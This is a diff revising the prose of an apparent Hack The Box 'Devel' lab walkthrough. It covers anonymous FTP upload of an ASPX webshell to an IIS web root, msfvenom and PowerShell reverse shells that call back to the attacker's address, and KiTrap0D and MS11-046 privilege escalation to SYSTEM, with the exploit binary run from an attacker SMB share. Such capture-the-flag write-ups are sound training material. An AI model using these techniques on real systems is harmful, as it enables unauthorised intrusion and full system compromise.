@@ -67,7 +67,9 @@ Nmap done: 1 IP address (1 host up) scanned in 17.68 seconds
 ---
 ### Enumeration
 
-Let's first start by scanning the machine and see what ports are open. We can use our normal safe scripts `-sC` and versions `-sV` flags to give us some clues about what's running on the machine. This machine looks to only offer two ports and should be more straightforward to enumerate.
+The first step is to perform an initial reconnaissance scan to identify the services exposed by the target. Using Nmap with the default script (-sC) and service version detection (-sV) options provides a safe and efficient way to gather information about the host without relying on intrusive techniques.
+
+The scan reveals that the target exposes only two network services, significantly reducing the attack surface and making the initial enumeration process relatively straightforward.
 ```Shell
 ┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/Devel]
 └─$ nmap -sCV -oA Scans/Nmap-Service+Version 10.129.36.65
@@ -77,12 +79,16 @@ PORT   STATE SERVICE VERSION
 80/tcp open  http    Microsoft IIS httpd 7.5
 ```
 
-We see both port 21 (FTP) and 80 (HTTP) open so we will need to investigate these ports ahead. We decide that based on our Nmap information we should first start with FTP as it looks to accept Anonymous access and it looks to have some possibly interesting files in that share.
+The scan identifies two exposed services: FTP on port 21 and HTTP on port 80. Based on the Nmap results, FTP is the most promising initial attack vector because it appears to permit anonymous authentication. Misconfigured anonymous FTP shares can expose sensitive files or writable directories, making them a valuable target during early-stage enumeration.
+
+As a result, the next step is to investigate the FTP service and determine what files or directories are accessible without authentication.
 
 ---
 ### FTP (Port 21)
 
-Our Nmap scans showed that the FTP share has files that we can access using the `Anonymous` user, we will start there and see if there is anything of particular interest. We can access the share using the `ftp` command and the box's IP address, we will then be prompted for a username and password which we use `Anonymous` for both.
+The Nmap scan indicates that the FTP service allows anonymous authentication, making it the most promising starting point for enumeration. Misconfigured anonymous FTP shares can often expose sensitive files or provide write access, both of which may lead to further compromise.
+
+To investigate the service, connect using the ftp client followed by the target's IP address. When prompted for credentials, authenticate using the username anonymous. Unless otherwise configured, the password can be left blank or set to anonymous, both of which are commonly accepted by anonymous FTP services. Once authenticated, enumerate the contents of the share and inspect any accessible files or directories for information that may assist in further exploitation.
 ```Shell
 ┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/Devel]
 └─$ ftp 10.129.36.65
@@ -96,7 +102,7 @@ Remote system type is Windows_NT.
 ftp>
 ```
 
-Once connected we can then inspect the share's contents using the `dir` command, we see three interesting files that give us some important hints about where the share might be located and what kind of web service and file type architecture it might be using.
+After successfully authenticating, the contents of the FTP share can be listed using the dir command. The directory contains three files of particular interest, each providing valuable clues about the underlying environment. Together, they suggest the location of the FTP share within the web server's directory structure, identify the web server software in use, and indicate the technologies and file types supported by the application. These observations will help guide the next stages of enumeration and exploitation.
 ```Shell
 ftp> dir
 229 Entering Extended Passive Mode (|||49158|)
@@ -114,7 +120,9 @@ local: iisstart.htm remote: iisstart.htm <-- Grab the Homepage
 689 bytes received in 00:00 (29.18 KiB/s)
 ```
 
-When we inspect the contents of the `iisstart.htm` file we can see it's a landing page for IIS and could likely mean that the FTP share is located in the web root directory of the Devel machine. If this is the case we have some interesting options open to us ahead, but we should validate our findings with evidence first.
+Inspecting the contents of iisstart.htm reveals that it is the default landing page for Microsoft Internet Information Services (IIS). This strongly suggests that the FTP share is mapped to the web server's document root, meaning any files uploaded to the share may be served directly by the web application.
+
+If this assumption is correct, it could provide a viable path to remote code execution. However, rather than relying on inference alone, it is important to validate this hypothesis by gathering supporting evidence before proceeding with exploitation.
 ```HTML
 ┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/Devel]
 └─$ cat iisstart.htm                                                                                                
@@ -152,17 +160,20 @@ a img {
 </html> 
 ```
 
-Given that we now have a suspicion of the FTP share being located in the web root folder, we should move on to port 80 and see what's being hosted at that location. If we confirm the presence of the files this will mean we can start to formulate an attack.
+With the hypothesis that the FTP share is mapped to the web server's document root, the next step is to investigate the HTTP service on port 80. If the files observed via FTP are also accessible through the web server, it will confirm that the share resides within the web root.
+
+Establishing this relationship is a key finding, as it demonstrates that files uploaded via FTP can potentially be served over HTTP. This significantly expands the available attack surface and provides a foundation for developing a viable exploitation strategy.
 
 ---
 
 # HTTP (Port 80)
 
-Inspecting the web service is straightforward — we load up Firefox and enter the machine's URL, in our case `http://10.129.36.65/`. Once loaded we get the expected result and see a default landing page for IIS.
-
+Inspecting the web service is straightforward. Navigating to the target URL, http://10.129.36.65/, displays the default Microsoft IIS landing page. This matches the iisstart.htm file discovered earlier through FTP enumeration and provides further evidence that the FTP share may be linked to the web server's document root.
 ![IIS default landing page]({{ '/assets/img/htb-devel/Devel_HTTP_IIS.png' | relative_url }})
 
-This is a good start but does not alone confirm our findings. We will need to upload something via our Anonymous FTP access and then attempt to navigate to the resource. We create the following HTML file and call it `proof.html`, we can use this to validate our findings conclusively if we can upload and access it.
+While the IIS landing page supports our assumption, it does not conclusively confirm that the FTP share is mapped to the web root. To validate this, we will upload a test file using our anonymous FTP access and attempt to access it through the web service.
+
+We create a simple HTML file named proof.html, which will allow us to confirm whether files uploaded via FTP are being served by IIS. Successful access to this file through the browser would provide the evidence needed to confirm our findings.
 
 > **Good Methodology — Validate Before Exploiting**
 >
@@ -206,7 +217,7 @@ h1{color:#2e8b57;margin-top:0;}
 </html>
 ```
 
-We upload the `proof.html` file using our FTP access from earlier, we use the `put` command to upload our test file and we can see if we can access it next.
+Using our existing anonymous FTP session, we upload the proof.html file to the server. The put command allows us to transfer the file to the FTP share, after which we can attempt to access it through the web service and verify whether it is being hosted by IIS.
 ```Shell
 ftp> put proof.html <-- Task 2
 local: proof.html remote: proof.html
@@ -217,7 +228,9 @@ local: proof.html remote: proof.html
 827 bytes sent in 00:00 (33.24 KiB/s)
 ```
 
-Navigating to `http://10.129.36.65/proof.html` we can see the file has successfully uploaded and we are able to access it, this confirms that the FTP share is in the web root directory and we formulate the idea that we might be able to get code execution on the machine.
+Navigating to http://10.129.36.65/proof.html confirms that the uploaded file is being served successfully by the web server. This provides conclusive evidence that the FTP share is mapped to the IIS web root directory.
+
+With this relationship confirmed, we can begin to consider potential attack paths. Since we have the ability to upload files that are accessible through the web service, the next logical step is to investigate whether this can be leveraged to achieve code execution on the target.
 
 ![Proof of upload confirmation page rendered in Firefox]({{ '/assets/img/htb-devel/Devel_HTTP_Upload.png' | relative_url }})
 
@@ -229,11 +242,11 @@ Navigating to `http://10.129.36.65/proof.html` we can see the file has successfu
 
 ---
 
-### ASPX WebShell
+### ASPX Webshell
 
-Given our above research, we are now in a position to attempt to run a webshell on the Devel machine, this will allow us to get Remote Code Execution (RCE) on the machine. We can start by locating a usable webshell on our Kali machine, we decide to use `.aspx` first and see if we have any success.
+With the FTP and web service relationship confirmed, we can now begin testing whether the file upload functionality can be leveraged to achieve Remote Code Execution (RCE) on the target machine. Since IIS supports ASP.NET, we will first attempt to upload an `.aspx` webshell and determine whether it is executed by the web server.
 
-We start by using the `locate` command to look through our Kali machine for any `.aspx` files that fit our requirement, we find one at `/usr/share/webshells/aspx/cmdasp.aspx` and we decide to copy this to our working directory for ease of use.
+To locate a suitable webshell, we use the `locate` command on our Kali machine to search for available .aspx payloads. We identify `/usr/share/webshells/aspx/cmdasp.aspx` as a suitable candidate and copy it into our working directory for easier management.
 ```Shell
 ┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/Devel]
 └─$ mkdir exploit
@@ -257,7 +270,7 @@ We start by using the `locate` command to look through our Kali machine for any 
 └─$ cp /usr/share/webshells/aspx/cmdasp.aspx shell.aspx
 ```
 
-We then upload the newly copied webshell named `shell.aspx` to the machine using our FTP access as before with the `put` command.
+Using our existing FTP session, we upload the renamed webshell shell.aspx to the target machine. The put command is used to transfer the file to the FTP share, after which we can attempt to access it through the web service and determine whether IIS processes the file successfully.
 ```Shell
 ftp> put shell.aspx
 local: shell.aspx remote: shell.aspx
@@ -269,17 +282,19 @@ local: shell.aspx remote: shell.aspx
 
 ```
 
-Navigating to `http://10.129.36.65/shell.aspx` gives us access to our webshell and we are able to run the `whoami` command, this allows us to see we are executing in the context of the `iis apppool\web` user and that we will likely need to escalate privileges later on.
+Navigating to `http://10.129.36.65/shell.aspx` successfully loads the webshell, confirming that IIS is processing the uploaded ASPX file. We can verify command execution by running `whoami`, which reveals that commands are being executed under the context of the `iis apppool\web` virtual service account.
+
+At this stage, we have achieved Remote Code Execution on the target; however, the current account context has limited privileges. Further enumeration and privilege escalation will be required to obtain higher-level access on the machine.
 
 ![Webshell whoami output showing iis apppool\web]({{ '/assets/img/htb-devel/Devel_WS_Whoami.png' | relative_url }})
 
-Now we have confirmed RCE, we can start attempting to move the shell into an interactive session. We have multiple ways to do this which will be explored ahead. Before rushing to get a more interactive shell we should take a moment to enumerate the machine.
+With Remote Code Execution confirmed, the next step is to gather additional information about the target before attempting to establish a more interactive shell. While there are several methods available for upgrading our current access, it is important to first perform local enumeration to better understand the environment and identify potential privilege escalation paths.
 
-Running the `systeminfo` command gives us some very useful information, a breakdown of the findings is as follows:
+Running the systeminfo command provides valuable information about the operating system and host configuration. The key findings are as follows:
 
-1. There is a user on the machine called `babis`, possibly handy for locating the user flag later.
-2. We have the OS name, version, and system type — from this we can confirm it is a Windows 7 32-bit machine running a very early version of the OS.
-3. No hotfixes have been applied to the machine, which may mean it has never been updated — possibly a fresh install straight from the disc.
+1. A local user account named "babis" exists on the machine, which may be useful when locating the user flag later in the process.
+2. The operating system details reveal that the target is running Windows 7 (32-bit), including the specific OS version and system architecture. This information will be useful when identifying potential vulnerabilities or applicable privilege escalation techniques.
+3. The system has no installed hotfixes, indicating that the machine may be significantly outdated and potentially vulnerable to known local privilege escalation vulnerabilities.
 
 ![systeminfo output from the webshell]({{ '/assets/img/htb-devel/Devel_WS_Sysinfo.png' | relative_url }})
 
@@ -291,18 +306,21 @@ Running the `systeminfo` command gives us some very useful information, a breakd
 
 ### Interactive Shells
 
-We have now got multiple ways to get a more interactive shell on the machine, we can demonstrate two that will lead us into both automated and manual exploitation paths ahead. We can use the online [RevShells](https://www.revshells.com/) website by 0day to help us generate our payloads and associated listener commands quickly and effectively.
+We now have several options available for upgrading our current access into a more interactive shell. To demonstrate different approaches, we will explore two methods that represent both automated and manual exploitation workflows.
 
+To assist with generating the required payloads and listener configurations, we can use the online [RevShells](https://www.revshells.com/) tool created by 0day. This provides a quick and reliable way to generate reverse shell commands while reducing the chance of errors when preparing payloads.
 
 **Meterpreter Reverse Shell**
 
-Let's start as we always do and go with the automated approach first. Once we get a callback from a Meterpreter shell we will have a wealth of options that the Metasploit framework offers and can be used to help us later on.
+We will begin with the automated approach by attempting to establish a Meterpreter session. A successful callback will provide access to the extensive functionality offered by the Metasploit Framework, which can assist with further enumeration, exploitation, and post-exploitation activities.
 
-Using our [RevShells](https://www.revshells.com/) resource we can not only get an msfvenom command for creating our desired payload, but it also offers us the associated listener command ready for catching the callback once we deploy the shell to Devel. All we need to do is enter our local IP and port and ensure that we use a `.aspx` shell type. Remembering our `systeminfo` output from earlier we select the required 32-bit based version.
+Using our [RevShells](https://www.revshells.com/) resource, we can generate both the `msfvenom` command required to create the payload and the corresponding Metasploit listener configuration needed to receive the connection. After providing our local IP address and listening port, we select an `.aspx` payload to match the IIS web server environment.
+
+Based on the earlier `systeminfo` output, we know the target is running a 32-bit version of Windows, so we ensure that the generated payload matches the correct architecture.
 
 ![RevShells meterpreter payload generation]({{ '/assets/img/htb-devel/Devel_IS_Meterpreter.png' | relative_url }})
 
-Using the generated command from above, we create a Meterpreter shell and choose to name it `met.aspx` for ease of use, which allows us to remember the shell type at a glance.
+Using the generated command from the previous step, we create our Meterpreter payload and save it as met.aspx. Naming the file with a descriptive identifier helps us quickly recognise the payload type during the exploitation process and avoids confusion when managing multiple files.
 ```Shell
 ┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Devel/exploit]
 └─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.39 LPORT=443 -f aspx -o met.aspx    
@@ -314,7 +332,7 @@ Final size of aspx file: 2873 bytes
 Saved as: met.aspx
 ```
 
-We then drop the file in the Devel machine's web root using our FTP access as before.
+Using our existing FTP access, we upload the Meterpreter payload to the target machine. As before, we use the `put` command to transfer the `met.aspx` file to the IIS web root directory.
 ```Shell
 ftp> put met.aspx
 local: met.aspx remote: met.aspx
@@ -325,7 +343,9 @@ local: met.aspx remote: met.aspx
 2913 bytes sent in 00:00 (118.54 KiB/s)
 ```
 
-We can then navigate to `http://10.129.36.65/met.aspx` and this will execute the payload. We will be greeted with a callback from the machine and our Meterpreter handler drops us into a session. We can use this access in the next section where we automate our enumeration and escalate our privileges using the Metasploit framework.
+Navigating to `http://10.129.36.65/met.aspx` executes the uploaded payload and triggers a callback from the target machine. Our Meterpreter handler successfully receives the connection, providing us with an interactive Meterpreter session.
+
+This session gives us a more powerful foothold on the machine and will be used in the next stage to automate enumeration and explore potential privilege escalation paths using the Metasploit Framework.
 ```Shell
 ┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Devel/exploit]
 └─$ sudo msfconsole -q -x "use multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost 10.10.14.39; set lport 443; exploit"
@@ -349,11 +369,13 @@ The command is Base64 encoded before being executed via the webshell to improve 
 
 ![RevShells PowerShell Base64 payload generation]({{ '/assets/img/htb-devel/Devel_IS_PowerShell.png' | relative_url }})
 
-Next we set up a listener on our machine using `nc -lvnp 31337` and copy the PowerShell command over to our webshell. Once pasted and run we should get a connection back to our machine and have an interactive session.
+We begin by setting up a Netcat listener on our attacking machine using `nc -lvnp 31337` to wait for the incoming connection. Once the listener is active, we copy the PowerShell payload into our webshell and execute it.
+
+If successful, the target machine will initiate a reverse connection back to our listener, providing us with an interactive shell session.
 
 ![Webshell with PowerShell Base64 payload pasted and executed]({{ '/assets/img/htb-devel/Devel_IS_Webshell2PowerShell.png' | relative_url }})
 
-We get a callback from the payload and now have a session on the machine. We will pick up from here again in the manual exploitation section ahead.
+The payload successfully connects back to our listener, providing us with an interactive shell on the target machine. We will continue from this point in the manual exploitation section, where we will perform further enumeration and explore the available privilege escalation paths.
 ```Powershell
 ┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/Devel]
 └─$ nc -lvnp 31337
@@ -399,9 +421,11 @@ iis apppool\web
 
 ### Automated Privilege Escalation
 
-At this point we know we have landed as a low-privileged user and our access is limited. We will now need to find possible privilege escalation routes open to us. Luckily, whilst using Metasploit we can deploy the `local_exploit_suggester` post-recon module that will test for possible exploits we can use to move vertically.
+At this stage, we have confirmed that our current access is running under a low-privileged account, limiting the actions we can perform on the target machine. The next step is to identify potential privilege escalation opportunities that may allow us to move to a higher-privileged context.
 
-We first background the active session, then we use the `search` function to look for the exploit suggester module. We are presented with two options and we are interested in the local exploit as we want to escalate privileges, not persist as a low-privilege account.
+When using Metasploit, we can leverage the `local_exploit_suggester` post-exploitation module to enumerate potential local exploits applicable to the target environment. This module compares the system information gathered from the session against known vulnerabilities and suggests possible escalation paths.
+
+To begin, we background our active session and use the search function to locate the exploit suggester module. The results present two available options; however, we are interested in the local exploit module because our goal is to escalate privileges on the existing host rather than maintain access to a low-privileged account.
 ```Shell
 meterpreter > bg
 [*] Backgrounding session 1...
@@ -421,7 +445,9 @@ Interact with a module by name or index. For example info 1, use 1 or use post/m
 msf exploit(multi/handler) > use 0
 ```
 
-We drop in the exploit suggester module and use the `show options` command to see we only require one option — the session the module will run on. We can run `sessions -l` to see our previous shell is set as session ID 1 and select it accordingly.
+We load the exploit suggester module and use the `show options` command to review the required configuration. The module only requires a single option: the session it will run against.
+
+Running `sessions -l` displays our active sessions, confirming that our previous Meterpreter session is assigned session ID 1. We select this session as the target for the exploit suggester module before running the enumeration.
 ```Shell
 msf post(multi/recon/local_exploit_suggester) > show options
 
@@ -447,7 +473,7 @@ msf post(multi/recon/local_exploit_suggester) > set SESSION 1
 SESSION => 1 
 ```
 
-We then run the module and wait a short while for it to complete.
+We execute the module and allow it time to complete its checks against the target system. Once finished, the results will provide us with potential privilege escalation exploits that may be applicable to the current environment.
 ```Shell
 msf post(multi/recon/local_exploit_suggester) > run
 [*] 10.129.36.65 - Collecting local exploits for x86/windows...
@@ -456,11 +482,13 @@ msf post(multi/recon/local_exploit_suggester) > run
 [*] 10.129.36.65 - Valid modules for session 1: 
 ```
 
-Once the module completes we can see a list of 42 results with 16 showing as potentially vulnerable. Given our earlier `systeminfo` output showing the box has never been updated, it is highly likely that the machine is vulnerable to all applicable candidates.
+Once the module completes, we are presented with 42 potential results, 16 of which are identified as potentially vulnerable. Combined with our earlier `systeminfo` output showing that the machine has no installed hotfixes, this suggests that several of the identified vulnerabilities may be applicable to the target environment.
+
+These results provide a useful starting point for further investigation; however, each candidate should be validated before attempting exploitation to determine the most suitable privilege escalation path.
 
 ![Local exploit suggester results showing 16 potential vulnerabilities]({{ '/assets/img/htb-devel/Devel_APE_ExploitSuggest.png' | relative_url }})
 
-For our purposes we choose to use the `exploit/windows/local/ms10_015_kitrap0d` module as we are going to explore this exploit in much more depth in the "Beyond Root" section.
+For this walkthrough, we will use the exploit/windows/local/ms10_015_kitrap0d module as our privilege escalation method. This exploit is particularly useful for demonstrating the underlying mechanics of Windows local privilege escalation, which will be explored in greater detail later in the "Dissecting The Exploit" section.
 
 > **MS10-015 (KiTrap0D)**
 >
@@ -468,7 +496,9 @@ For our purposes we choose to use the `exploit/windows/local/ms10_015_kitrap0d` 
 >
 > The exploit gets its name, *KiTrap0D*, from the Windows kernel function responsible for handling General Protection Fault (#GP) exceptions — exception vector 0xD (decimal 13) — which the vulnerability abuses to gain SYSTEM privileges.
 
-We select the module and see that it requires some options of its own. We use the `show options` command and see it not only requires a session parameter but also a local host for the new payload. We use the `setg` command to set the local host to our tun0 address globally, meaning this will be the default if we need to change modules again.
+After selecting the module, we review the required configuration options using the `show options` command. The module requires both the target session and a local host address for the generated payload callback.
+
+We use the `setg` command to configure our `tun0` address as the global local host value. This ensures the setting is retained as the default option across future Metasploit modules, reducing the need to manually configure the same value each time.
 ```Shell
 msf post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms10_015_kitrap0d
 [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
@@ -506,7 +536,7 @@ msf exploit(windows/local/ms10_015_kitrap0d) > set SESSION 1
 SESSION => 1
 ```
 
-Running the exploit works and we drop into a new session as `nt authority\system`, executing commands in a high-integrity context.
+Running the exploit successfully creates a new session with "nt authority\system privileges". This confirms that we have successfully escalated from our previous low-privileged context and now have command execution within a high-integrity security context.
 ```Shell
 msf exploit(windows/local/ms10_015_kitrap0d) > run
 [*] Started reverse TCP handler on 10.10.14.39:4444 
@@ -534,11 +564,14 @@ nt authority\system
 
 ### Manual Privilege Escalation
 
-With only our PowerShell session we will now need to employ more manual enumeration techniques to discover how to escalate our privileges. The only information we are armed with at this point is the result of the previously run `systeminfo`, which showed the machine is an older version with no hotfixes and creates a much wider attack surface.
+Using only our PowerShell session, we now need to take a more manual approach to enumeration and identify potential privilege escalation opportunities. At this stage, our primary source of information is the previously collected `systeminfo` output, which revealed that the target is running an outdated version of Windows with no installed hotfixes. This indicates that the machine may be vulnerable to several known local privilege escalation vulnerabilities.
 
-At the time of writing, a lot of tools were outdated or no longer worked — Watson, for example, is now version 2.0 and is not built for such an old system. After some research we discover [Windows Exploit Suggester - Next Generation](https://github.com/bitsadmin/wesng), which is perfect for our purposes as it only requires the output of a `systeminfo` command that we already have.
+During our research, we found that many commonly referenced Windows privilege escalation enumeration tools were either outdated, archived, or difficult to use against such an old target environment. For example, newer tools often required dependencies that were not compatible with the machine, such as newer .NET versions, making it challenging to find a suitable option that allowed us to continue our enumeration.
 
-We start by downloading the tool into our working directory, moving into it, and then placing the output of a `systeminfo` command from the Devel machine into a text file in that directory.
+After some time, we identified [Windows Exploit Suggester - Next Generation](https://github.com/bitsadmin/wesng) as a suitable tool for this scenario. WES-NG analyses the output from a `systeminfo` command and compares the results against known vulnerabilities, allowing us to identify potential privilege escalation paths without needing to execute additional enumeration tools on the target.
+
+We begin by cloning the repository into our working directory and moving into the newly created folder. We then place the `systeminfo` output collected from the Devel machine into a text file within the directory, ready for analysis.
+
 ```Shell
 ┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/Devel]
 └─$ git clone https://github.com/bitsadmin/wesng.git
@@ -601,8 +634,7 @@ Network Card(s):           1 NIC(s) Installed.
  
 ```
 
-
-We will first need to update the tool to get the required definitions.
+Before analysing the system information, we first need to update WES-NG and retrieve the latest vulnerability definitions required for the tool to perform its checks.
 ```Shell
 ┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Devel/wesng]
 └─$ python3 wes.py --update
@@ -611,7 +643,7 @@ Windows Exploit Suggester 1.06 ( https://github.com/bitsadmin/wesng/ )
 [+] Obtained definitions created at 20260716 
 ```
 
-We then run the tool and it produces a large list of known vulnerabilities. The output has been edited for brevity to show only the two exploits we will focus on in this walkthrough.
+We run the tool against the `systeminfo.txt` file, which produces a list of known vulnerabilities that may be applicable to the target. For readability, the output has been reduced to highlight only the two exploits we will explore further in the "Dissecting The Exploit" Section.
 ```Shell
 ┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Devel/wesng]
 └─$ python3 wes.py systeminfo.txt --impact "Elevation of Privilege"
@@ -678,14 +710,17 @@ Exploits: https://exploit-db.com/exploits/18755, https://exploit-db.com/exploits
 ```
 
 
-As seen in the above output there are 49 possible exploits, but we choose to select two. One is the KiTrap0D exploit we have already used with Metasploit. The other we can source a precompiled exploit for and run manually. We will look at both in more depth in the "Beyond Root" section.
+The output identifies 49 potential exploits that may be applicable to the target; however, we will focus on two for this walkthrough. The first is the KiTrap0D vulnerability, which we have already exploited using Metasploit. The second is an exploit that can be obtained as a precompiled binary and executed manually, allowing us to explore an alternative exploitation path.
 
 | Exploit                 | CVE               | Description                                                             |
 | ----------------------- | ----------------- | ----------------------------------------------------------------------- |
 | **MS10-015 (KiTrap0D)** | **CVE-2010-0233** | Windows Kernel General Protection Fault local privilege escalation.     |
 | **MS11-046 (AFD.sys)**  | **CVE-2011-1249** | Windows Ancillary Function Driver (AFD.sys) local privilege escalation. |
 
-We make use of abatchy17's GitHub repository called [WindowsExploits](https://github.com/abatchy17/WindowsExploits) as it contains a precompiled version of MS11-046, allowing us to streamline the process. We download the exploit and fire up an SMB share to allow us to run the executable remotely.
+We use abatchy17's [WindowsExploits](https://github.com/abatchy17/WindowsExploits) repository, which contains a precompiled version of the MS11-046 exploit. This allows us to quickly obtain a working binary and focus on the exploitation process rather than compiling the source code ourselves.
+
+After downloading the exploit, we host it from an SMB share on our attacking machine, allowing the target to access and execute the binary remotely.
+
 ```Shell
 ┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Devel/exploit]
 └─$ ls
@@ -743,7 +778,7 @@ c:\Windows\System32>[*] MS11-046 (CVE-2011-1249) x86 exploit
 PS C:\windows\system32\inetsrv> 
 ```
 
-We see the exploit complete but it kicks us back to the original session. This is where we come to realise that the shell we are using is not as interactive as we thought.
+The exploit completes successfully; however, instead of receiving a new elevated session, we are returned to our existing shell. This highlights an important limitation with our current PowerShell access: while we can execute commands, the shell does not behave like a fully interactive session.
 
 > **Lessons Learned — Why the Exploit Exited Immediately**
 >
@@ -751,13 +786,13 @@ We see the exploit complete but it kicks us back to the original session. This i
 >
 > This is a symptom of the shell chain: **webshell → PowerShell → exploit**. Each link in that chain is non-interactive. The PowerShell session we labelled as "interactive" earlier is technically a dumb shell — it can run commands but cannot host child processes that require a console context to persist in. The solution is a properly interactive reverse shell (the `shell.exe` generated by msfvenom below) which allocates a real console that the spawned SYSTEM process can attach to and remain open in.
 
-We can fix the issue by generating a new reverse shell using `msfvenom`. This will allow us to avoid any future issues running executables or tools that do not work correctly.
+To resolve this issue, we generate a new reverse shell using `msfvenom`. This provides us with a more reliable method of interacting with the target and should prevent compatibility issues when executing binaries or additional tooling during the privilege escalation process.
 ```Shell
 ┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Devel/exploit]
 └─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.39 LPORT=4443 -f exe -o shell.exe
 ```
 
-From our PowerShell session spawned from the webshell, we remotely call the newly generated `shell.exe` and get a callback from a truly interactive session.
+From our existing PowerShell session, spawned through the webshell, we remotely execute the newly generated `shell.exe` payload from our SMB share. The payload successfully connects back to our newly created listener, providing us with a more reliable and interactive shell session for further enumeration and exploitation.
 ```PowerShell
 ┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/Devel]
 └─$ nc -lvnp 31337
@@ -777,8 +812,7 @@ Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
 C:\windows\system32\inetsrv>
 ```
 
-
-From this session we can remotely call and execute `MS11-046.exe` using our SMB server. This time the exploit works and we land as `nt authority\system`, giving us complete control over the machine.
+From our upgraded shell session, we can now remotely execute MS11-046.exe from our SMB share. This time the exploit completes successfully, providing us with a new session running as "NT AUTHORITY\SYSTEM" and confirming that we have successfully escalated our privileges to the highest security context on the machine.
 ```Shell
 C:\windows\system32\inetsrv>\\10.10.14.39\kali\MS11-046.exe
 \\10.10.14.39\kali\MS11-046.exe
@@ -792,12 +826,12 @@ hostname
 devel
 ```
 
-As we have now successfully escalated our privileges we can attempt to locate the flags on the box in the next section, completing the machine.
+With successful privilege escalation achieved, we now have the required level of access to locate and retrieve the user and root flags from the machine. In the next section, we will complete the box by locating these files and confirming full compromise of the target.
 
 ---
 ### Obtaining the Flags
 
-We now have the ability to fetch both the `root.txt` and `user.txt` flags on the machine. We will use our trusty `dir` command from the last walkthrough to locate them, then use `type` to read their contents.
+With our privileges successfully escalated, we now have sufficient access to retrieve both the `user.txt` and `root.txt` flags from the machine. We can use the `dir` command from our previous walkthrough to locate the files, then use the `type` command to display their contents and complete the box.
 
 ```Shell
 c:\Windows\System32>dir C:\ /s /b /a:-d 2>nul | find "root.txt"
@@ -823,9 +857,9 @@ type C:\Users\babis\Desktop\user.txt
 
 ---
 
-### Beyond Root
+### Dissecting the Exploit
 
-Ending things here would leave the most interesting part unexamined — at this point we have fired exploits without fully understanding why and how they work. In this section we analyse the two privilege escalation exploits and compare them at an operational level.
+Ending the walkthrough here would leave the most interesting part unexplored. Up to this point, we have successfully executed two privilege escalation exploits, but we have not yet examined the underlying mechanics behind how or why they work. In this section, we will dissect both exploits, exploring their technical foundations and comparing their behaviour from an operational perspective.
 
 **MS10-015 (KiTrap0D) — CVE-2010-0233**
 
